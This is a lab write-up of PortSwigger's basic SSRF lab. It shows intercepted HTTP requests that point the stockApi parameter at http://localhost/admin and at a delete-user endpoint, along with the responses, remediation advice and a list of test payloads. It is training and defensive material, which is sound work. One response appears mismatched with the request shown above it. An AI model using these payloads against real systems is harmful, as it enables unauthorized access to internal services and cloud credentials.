# PortSwigger Web Security Academy Lab Report: Basic SSRF Against the Local Server



**Report ID:** PS-LAB-SSRF-001  

**Author:** Venu Kumar (Venu)  

**Date:** February 12, 2026  

**Lab Level:** Apprentice  

**Lab Title:** Basic SSRF against the local server



## Executive Summary:

**Vulnerability Type:** Server-Side Request Forgery (SSRF) – Basic / Localhost Access  

**Severity:** High (CVSS 3.1 Score: 8.6 – AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N – allows unauthorized internal access)

**Description:** A Server-Side Request Forgery vulnerability exists in the stock check functionality. The application fetches data from a user-controlled URL (`stockApi` parameter) without validation or restrictions. This allows the server to make arbitrary requests on behalf of the attacker, including to internal/localhost resources (e.g., `http://localhost/admin`). Exploitation retrieves the admin panel and deletes a user.

**Impact:** Unauthorized access to internal services, metadata endpoints, admin interfaces, or cloud metadata (e.g., AWS/GCP metadata in production). Could lead to data exfiltration, account takeover, or further compromise.

**Status:** Exploited in controlled lab environment only; no real-world impact. Educational report.



## Environment and Tools Used:

**Target:** Simulated e-commerce site from PortSwigger Web Security Academy (e.g., `https://*.web-security-academy.net`)  

**Browser:** Google Chrome (Version 120.0 or similar)  

**Tools:** Burp Suite Community Edition (Version 2023.12 or similar) – interception, modification (Repeater), analysis  

**Operating System:** Windows 11  

**Test Date/Time:** February 12, 2026, approximately 10:08 AM IST



## Methodology:

Conducted following ethical hacking best practices in a safe, simulated environment.

1. Accessed the lab via "Access the lab" in PortSwigger Academy.  
2. Attempted direct access to `/admin` → blocked (not publicly accessible).  
3. Selected a product → clicked "Check stock" → intercepted POST request in Burp Proxy (to `/product/stock`).  
4. Sent request to Burp Repeater.  
5. Observed `stockApi` parameter (e.g., `http://stock.weliketoshop.net:8080/product/stock-check/...`).  
6. Modified `stockApi` to `http://localhost/admin` → sent → admin panel displayed in response.  
7. Identified delete endpoint: `http://localhost/admin/delete?username=carlos`  
8. Updated `stockApi` to `http://localhost/admin/delete?username=carlos` → sent → user deleted.  
9. Lab solved (green banner: "Congratulations, you solved the lab!").



## Detailed Findings:

**Vulnerable Endpoint:** POST `/product/stock` (stock check feature)


**Original Input (Safe Test):**

POST /product/stock HTTP/2
Host: 0ac00005045a7cff802535e3003a00b6.web-security-academy.net
Cookie: session=w4kHMxMAbUpeNtDvsbcxuMnUBZCNLAi9
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost


**Reflected Output:**

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 3174
Set-Cookie: session=eoB57qPKknL8WmISGj3ofb65iCUl5TPK; Secure; HttpOnly; SameSite=None

<!DOCTYPE html>
<html>
<head>
    <title>Basic SSRF against the local server</title>
</head>
<body>
    <!-- Lab header: "Not solved" status -->
    
    <!-- Admin panel shows users: -->
    <h1>Users</h1>
    <div>wiener - <a href="/admin/delete?username=wiener">Delete</a></div>
    <div>carlos - <a href="/admin/delete?username=carlos">Delete</a></div>
</body>
</html>



Modified request 1:

POST /product/stock HTTP/2
Host: 0ac00005045a7cff802535e3003a00b6.web-security-academy.net
Cookie: session=w4kHMxMAbUpeNtDvsbcxuMnUBZCNLAi9
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin


Response:

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 6123
Set-Cookie: session=PbFUkPV833zgQy0PBaGFvHoDBCV4cVZX; Secure; HttpOnly; SameSite=None

<!DOCTYPE html>
<html>
<head>
    <title>Basic SSRF against the local server</title>
</head>
<body>
    <!-- Lab header: "SOLVED" status + celebration message -->
    
    <!-- SSRF success response: -->
    <p>User deleted successfully!</p>
    <h1>Users</h1>
    <div>wiener - <a href="/admin/delete?username=wiener">Delete</a></div>
    <!-- Carlos gone! -->
</body>
</html>



Proof of Exploitation:



![Proof of SSRF Error](https://github.com/venu-maxx/PortSwigger-SSRF-Lab-1/blob/bdcd8ec19f1d2509f3cb236f1e25ed6b8c6b9c71/PortSwigger-SSRF-Lab-1%20Error.png)

Figure 1: Admin interface retrieved by changing stockApi to http://localhost/admin.


![Proof of Successful SSRF Exploitation](https://github.com/venu-maxx/PortSwigger-SSRF-Lab-1/blob/8a51c93e8eff91b322beead323c3dd4594606f92/PortSwigger%20SSRF%20Lab%201%20success.png)

Figure 2: Successful deletion of user 'carlos' via internal endpoint.


![Lab Solved Congratulations](https://github.com/venu-maxx/PortSwigger-SSRF-Lab-1/blob/894b6b2724293d408358a6b011f10d48ef168722/PortSwigger%20SSRF%20Lab%201%20Lab%20Completed.png)

Figure 3: PortSwigger Academy confirmation – "Congratulations, you solved the lab!"



Exploitation Explanation:

The application blindly trusts and fetches from the stockApi URL server-side, returning the response to the client. By setting it to http://localhost/admin, the server requests its own internal admin page (loopback interface) and reflects it. Extending to /admin/delete?username=carlos performs privileged actions. No allowlist, deny-list, or validation prevents localhost/internal access.



Risk Assessment:

Likelihood: High (user-controlled URL parameter, no restrictions).
Impact: High to Critical — internal resource access, potential metadata exfiltration (e.g., cloud keys), or RCE in chained attacks.
Affected Components: Stock check backend fetch logic.



Recommendations for Remediation:

Implement strict URL validation / allowlist for external fetches (only trusted domains).
Block internal/private IPs (127.0.0.1, 0.0.0.0, localhost, 169.254.x.x metadata).
Use network-level restrictions (e.g., no outbound to localhost from app container).
Avoid returning full backend responses to clients (sanitize or proxy only needed data).
Deploy WAF with SSRF signatures.
Regular scanning (Burp Scanner, OWASP ZAP) and code reviews.



Conclusion and Lessons Learned:

This lab demonstrated basic SSRF against localhost: server trusts user-supplied URL → accesses internal admin → performs actions.

Key Takeaways:

SSRF often hides in "fetch URL" features (stock check, webhooks, imports).
Test with http://localhost/admin, http://127.0.0.1, http://[::1].
Internal access enables privilege escalation or data leaks.
Strengthened skills in intercepting/modifying requests, identifying SSRF sinks.



References:

PortSwigger Academy: Basic SSRF against the local server
General: Server-side request forgery (SSRF)
